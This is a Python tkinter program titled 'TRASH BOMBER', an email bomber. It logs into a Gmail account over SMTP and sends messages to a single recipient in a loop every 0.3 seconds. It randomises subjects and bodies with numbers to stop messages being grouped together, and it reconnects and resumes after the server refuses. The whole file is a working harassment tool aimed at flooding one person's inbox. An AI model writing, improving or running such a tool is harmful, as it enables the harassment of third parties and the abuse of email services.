from tkinter import ttk
from tkinter import*
import smtplib, threading, random, time

sent, stop, badCred = 0,0,0

def spam():
    global sent, var, badCred

    credentials = emailSender.get().split(",")
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    try: 
        server.login(f"{credentials[0]}", f"{credentials[1]}")
    except smtplib.SMTPAuthenticationError or IndexError:
        emailsSent["text"] = "Bad credentials."
        badCred = 1
        threading.Thread(target=turnoff).start()
    except:
        emailsSent["text"] = "And unknown error occurred!"
        badCred = 1
        threading.Thread(target=turnoff).start()

    while stop == 0:
        if badCred == 1:
            badCred = 0
            break
        try:
            print(credentials)
            em = emailMessage.get("1.0",END).split()
            es = emailSubject.get("1.0",END).split()
            randomNumber = (str(random.randint(0, 9999999)))
            try:
                if var.get() == 0: msg = f"Subject: {emailSubject.get()}\n\n{emailMessage.get()}".encode(encoding="utf-8")
                else: msg = f"Subject: {es} ({randomNumber})\n\n{em[random.randint(0, len(em) - 1)]}\n({randomNumber})".encode(encoding="utf-8")
            except:
                emailsSent["text"] = "Boxes are empty."
                badCred = 1
                threading.Thread(target=turnoff).start()
                break

            try:
                server.sendmail(f"{emailSender.get()}", emailReceiver.get(), msg)
            except:
                emailsSent["text"] = "Bad sender's email."
                badCred = 1
                threading.Thread(target=turnoff).start()
                break
            sent += 1
            emailsSent["text"] = f"Emails sent: {str(sent)}"
            if stop == 1:
                emailsSent["text"] = ""
                sent = 0
                break
            time.sleep(0.3)
        except smtplib.SMTPSenderRefused:
            print("eror XDXD")
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.login(f"{credentials[0]}", f"{credentials[1]}")
            if stop == 1:
                emailsSent["text"] = ""
                sent = 0
                break
            time.sleep(60)
        except smtplib.SMTPAuthenticationError:
            emailsSent["text"] = "Wrong password!"
            badCred = 1
            threading.Thread(target=turnoff).start()
            break


def stopThread():
    global stop
    stop = 1

def turnoff():
    time.sleep(2)
    emailsSent["text"] = ""

app = Tk()
var = IntVar()
app.geometry("945x400")
app.title("TRASH BOMBER")
app.resizable(False, False)

ttk.Label(app, text="Subjects:", font=("Arial", 12)).grid(row=0, column=0, pady=20)
emailSubject = Text(app, width=40, height=20)
emailSubject.grid(row=1, column=0, padx=10, rowspan=200)

ttk.Label(app, text="Messages:", font=("Arial", 12)).grid(row=0, column=1, pady=20)
emailMessage = Text(app, width=40, height=20)
emailMessage.grid(row=1, column=1, padx=10, rowspan=200)

ttk.Label(app, text="Sender's email and password\n           (separate by \",\"):", font=("Arial", 12)).grid(row=0, column=2, columnspan=2)
emailSender = ttk.Entry(app, width=40)
emailSender.grid(row=1, column=2, columnspan=2)

ttk.Label(app, text="Receiver's email:", font=("Arial", 12)).grid(row=2, column=2, pady=10, columnspan=2)
emailReceiver = ttk.Entry(app, width=40)
emailReceiver.grid(row=3, column=2, pady=5, columnspan=2)

randomNum = ttk.Checkbutton(app, text="Include random number at the\nend to prevent message stacking", takefocus=0, variable=var)
randomNum.grid(row=6, column=2, pady=5, columnspan=2)

button_start = ttk.Button(text="Start", width=19, takefocus=0, command=lambda: threading.Thread(target=spam).start())
button_start.grid(row=7, column=2)  

button_stop = ttk.Button(text="Stop", width=19, takefocus=0, command=stopThread)
button_stop.grid(row=7, column=3)

emailsSent = Label(font=("Arial", 12))
emailsSent.grid(row=8, column=2, columnspan=2, pady=20)

app.mainloop()